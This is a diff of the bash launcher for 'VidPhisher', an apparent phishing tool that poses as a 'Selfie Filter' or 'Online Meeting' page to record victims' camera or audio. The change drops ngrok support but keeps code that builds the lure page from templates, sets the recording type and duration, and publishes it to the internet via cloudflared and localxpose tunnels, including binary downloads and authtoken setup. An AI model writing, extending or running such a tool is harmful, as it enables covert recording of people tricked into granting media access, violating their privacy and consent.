@@ -127,14 +127,6 @@ ${red}                                          [v${version}]
 ${blue}                                  [By KasRoudra] 
 "
 
-ngrok_help="
-${info}Steps: ${nc}
-${blue}[1]${yellow} Go to ${green}https://ngrok.com
-${blue}[2]${yellow} Create an account 
-${blue}[3]${yellow} Login to your account
-${blue}[4]${yellow} Visit ${green}https://dashboard.ngrok.com/get-started/your-authtoken${yellow} and copy your authtoken
-"
-
 loclx_help="
 ${info}Steps: ${nc}
 ${blue}[1]${yellow} Go to ${green}https://localxpose.io
@@ -154,24 +146,17 @@ fi
 # Check if mac or termux
 termux=false
 brew=false
-ngrok=false
 cloudflared=false
 loclx=false
-ngrok_command="$tunneler_dir/ngrok"
 cf_command="$tunneler_dir/cloudflared"
 loclx_command="$tunneler_dir/loclx"
 if [[ -d /data/data/com.termux/files/home ]]; then
     termux=true
-    ngrok_command="termux-chroot $tunneler_dir/ngrok"
     cf_command="termux-chroot $tunneler_dir/cloudflared"
     loclx_command="termux-chroot $tunneler_dir/loclx"
 fi
 if command -v brew > /dev/null 2>&1; then
     brew=true
-    if command -v ngrok > /dev/null 2>&1; then
-        ngrok=true
-        ngrok_command="ngrok"
-    fi
     if command -v cloudflared > /dev/null 2>&1; then
         cloudflared=true
         cf_command="cloudflared"
@@ -186,7 +171,7 @@ vp_prompt="\n${cyan}Vid${nc}@${cyan}Phisher ${red}$ ${nc}"
 
 # Kill running instances of required packages
 killer() {
-    for process in php wget curl unzip ngrok cloudflared loclx localxpose; do
+    for process in php wget curl unzip cloudflared loclx localxpose; do
         if pidof "$process" > /dev/null 2>&1; then
             killall "$process"
         fi
@@ -361,7 +346,6 @@ fi
 
 # Install tunneler binaries
 if $brew; then
-    ! $ngrok && brew install ngrok/ngrok/ngrok
     ! $cloudflared && brew install cloudflare/cloudflare/cloudflared
     ! $loclx && brew install localxpose
 fi
@@ -380,14 +364,14 @@ if [ -z $SUBDOMAIN ]; then
 fi
 
 
-# Set Region for ngrok/loclx
+# Set Region for loclx
 if [ -z $REGION ]; then
     exit 1;
 fi
 
 # Check for running processes that couldn't be terminated
 killer
-for process in php wget curl unzip ngrok cloudflared loclx localxpose; do
+for process in php wget curl unzip cloudflared loclx localxpose; do
     if pidof "$process"  > /dev/null 2>&1; then
         echo -e "${error}Previous ${process} cannot be closed. Restart terminal!\007\n"
         exit 1
@@ -402,11 +386,6 @@ platform=$(uname)
 if ! [[ -d $tunneler_dir ]]; then
     mkdir $tunneler_dir
 fi
-if ! [[ -f $tunneler_dir/ngrok ]] ; then
-    nongrok=true
-else
-    nongrok=false
-fi
 if ! [[ -f $tunneler_dir/cloudflared ]] ; then
     nocf=true
 else
@@ -418,37 +397,31 @@ else
     noloclx=false
 fi
 netcheck
-rm -rf ngrok.tgz ngrok.zip cloudflared cloudflared.tgz loclx.zip
+rm -rf cloudflared cloudflared.tgz loclx.zip
 cd "$cwd"
 if echo "$platform" | grep -q "Darwin"; then
     if echo "$arch" | grep -q "x86_64" || echo "$arch" | grep -q "amd64"; then
-        $nongrok && manage_tunneler "https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-v3-stable-darwin-amd64.zip" "ngrok.zip"
         $nocf && manage_tunneler "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-amd64.tgz" "cloudflared.tgz"
         $noloclx && manage_tunneler "https://api.localxpose.io/api/v2/downloads/loclx-darwin-amd64.zip" "loclx.zip"
     elif echo "$arch" | grep -q "arm64" || echo "$arch" | grep -q "aarch64"; then
-        $nongrok && manage_tunneler "https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-v3-stable-darwin-arm64.zip" "ngrok.zip"
         echo -e "${error}Device architecture unknown. Download cloudflared manually!"
         sleep 3
         $noloclx && manage_tunneler "https://api.localxpose.io/api/v2/downloads/loclx-darwin-arm64.zip" "loclx.zip"
     else
-        echo -e "${error}Device architecture unknown. Download ngrok/cloudflared/loclx manually!"
+        echo -e "${error}Device architecture unknown. Download cloudflared/loclx manually!"
         sleep 3
     fi
 elif echo "$platform" | grep -q "Linux"; then
     if echo "$arch" | grep -q "arm" || echo "$arch" | grep -q "Android"; then
-        $nongrok && manage_tunneler "https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-v3-stable-linux-arm.tgz" "ngrok.tgz"
         $nocf && manage_tunneler "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm" "cloudflared"
         $noloclx && manage_tunneler "https://api.localxpose.io/api/v2/downloads/loclx-linux-arm.zip" "loclx.zip"
     elif echo "$arch" | grep -q "aarch64" || echo "$arch" | grep -q "arm64"; then
-        $nongrok && manage_tunneler "https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-v3-stable-linux-arm64.tgz" "ngrok.tgz"
         $nocf && manage_tunneler "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64" "cloudflared"
         $noloclx && manage_tunneler "https://api.localxpose.io/api/v2/downloads/loclx-linux-arm64.zip" "loclx.zip"
     elif echo "$arch" | grep -q "x86_64" || echo "$arch" | grep -q "amd64"; then
-        $nongrok && manage_tunneler "https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-v3-stable-linux-amd64.tgz" "ngrok.tgz"
         $nocf && manage_tunneler "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64" "cloudflared"
         $noloclx && manage_tunneler "https://api.localxpose.io/api/v2/downloads/loclx-linux-amd64.zip" "loclx.zip"
     else
-        $nongrok && manage_tunneler "https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-v3-stable-linux-386.tgz" "ngrok.tgz"
         $nocf && manage_tunneler "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386" "cloudflared"
         $noloclx && manage_tunneler "https://api.localxpose.io/api/v2/downloads/loclx-linux-386.zip" "loclx.zip"
     fi
@@ -494,27 +467,6 @@ if [[ "$git_ver" != "404: Not Found" && "$git_ver" != "$version" ]]; then
         fi
 fi
 
-# Ngrok Authtoken
-if ! [[ -e "$HOME/.config/ngrok/ngrok.yml" ]]; then
-    for try in 1 2; do
-        echo -e "\n${ask}Enter your ngrok authtoken:${yellow}[${blue}Enter 'help' for help${yellow}]"
-        printf "$vp_prompt"
-        read authtoken
-        if [ -z "$authtoken" ]; then
-            echo -e "\n${error}No authtoken!\n\007"
-            sleep 1
-            break
-        elif [ "$authtoken" == "help" ]; then
-            echo -e "$ngrok_help"
-            sleep 4
-        else
-            $ngrok_command config add-authtoken ${authtoken}
-            sleep 1
-            break
-        fi
-    done
-fi
-
 # Loclx Authtoken
 if ! [[ -e "$HOME/.localxpose/.access" ]]; then # if $loclx_command account status | grep -q "Error"; then
     for try in 1 2; do
@@ -549,7 +501,7 @@ echo -e "${ask}Choose an option:
 
 ${cyan}[${white}1${cyan}] ${yellow}Selfie Filter
 ${cyan}[${white}2${cyan}] ${yellow}Online Meeting
-${cyan}[${white}d${cyan}] ${yellow}Change Image Directory (current: ${red}${FOL}${yellow})
+${cyan}[${white}d${cyan}] ${yellow}Change Media Directory (current: ${red}${FOL}${yellow})
 ${cyan}[${white}t${cyan}] ${yellow}Change Type of Media (current: ${red}${TYPE}${yellow})
 ${cyan}[${white}p${cyan}] ${yellow}Change Default Port (current: ${red}${PORT}${yellow})
 ${cyan}[${white}s${cyan}] ${yellow}Change Default Duration (current: ${red}${DURATION}${yellow})
@@ -702,19 +654,12 @@ if [ "$SUBDOMAIN" != false ]; then
         args="$args --subdomain $SUBDOMAIN"
     fi
 fi
-$ngrok_command http $args "${local_url}" > /dev/null 2>&1 &
 $cf_command tunnel -url "${local_url}" &> "$tunneler_dir/cf.log" &
 $loclx_command tunnel --raw-mode http --https-redirect $args -t "${local_url}" &> "$tunneler_dir/loclx.log" &
 sleep 10
 cd "$HOME/.site"
 sed "s+siteName+"$dir"+g" template.php > index.php
 sed "s+mediaType+"$TYPE"+g" template.js | sed "s+recordingTime+"$DURATION"+g" > recorder.js
-ngroklink=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z.]*.ngrok.io")
-if ! [ -z "$ngroklink" ]; then
-    ngrokcheck=true
-else
-    ngrokcheck=false
-fi
 for second in {1..10}; do
     if [ -f "$tunneler_dir/cf.log" ]; then
         cflink=$(grep -Eo "https://[-0-9a-z.]{4,}.trycloudflare.com" "$tunneler_dir/cf.log")
@@ -740,33 +685,21 @@ for second in {1..10}; do
         loclxcheck=false
     fi
 done
-if ( $ngrokcheck && $cfcheck && $loclxcheck ); then
-    echo -e "${success}Ngrok, Cloudflared and Loclx have started successfully!\n"
+if ( $cfcheck && $loclxcheck ); then
+    echo -e "${success}Cloudflared and Loclx have started successfully!\n"
     url_manager "$cflink" 1 2
-    url_manager "$ngroklink" 3 4
-    url_manager "$loclxlink" 5 6
-elif ( $ngrokcheck && $cfcheck &&  ! $loclxcheck ); then
-    echo -e "${success}Ngrok and Cloudflared have started successfully!\n"
-    url_manager "$cflink" 1 2
-    url_manager "$ngroklink" 3 4
-elif ( $ngrokcheck && $loclxcheck &&  ! $cfcheck ); then
-    echo -e "${success}Ngrok and Loclx have started successfully!\n"
-    url_manager "$ngroklink" 1 2
     url_manager "$loclxlink" 3 4
+elif ( $cfcheck &&  ! $loclxcheck ); then
+    echo -e "${success}Cloudflared has started successfully!\n"
+    url_manager "$cflink" 1 2
+elif ( $loclxcheck &&  ! $cfcheck ); then
+    echo -e "${success} Loclx have started successfully!\n"
+    url_manager "$loclxlink" 1 2
 elif ( $cfcheck && $loclxcheck &&  ! $loclxcheck ); then
     echo -e "${success}Cloudflared and Loclx have started successfully!\n"
     url_manager "$cflink" 1 2
     url_manager "$loclxlink" 3 4
-elif ( $ngrokcheck && ! $cfcheck &&  ! $loclxcheck ); then
-    echo -e "${success}Ngrok has started successfully!\n"
-    url_manager "$ngroklink" 1 2
-elif ( $cfcheck &&  ! $ngrokcheck &&  ! $loclxcheck ); then
-    echo -e "${success}Cloudflared has started successfully!\n"
-    url_manager "$cflink" 1 2
-elif ( $loclxcheck && ! $ngrokcheck &&  ! $cfcheck ); then
-    echo -e "${success}Loclx has started successfully!\n"
-    url_manager "$loclxlink" 1 2
-elif ! ( $ngrokcheck && $cfcheck && $loclxcheck ) ; then
+elif ! ( $cfcheck && $loclxcheck ) ; then
     echo -e "${error}Tunneling failed! Start your own port forwarding/tunneling service at port ${PORT}\n";
 fi
 sleep 1
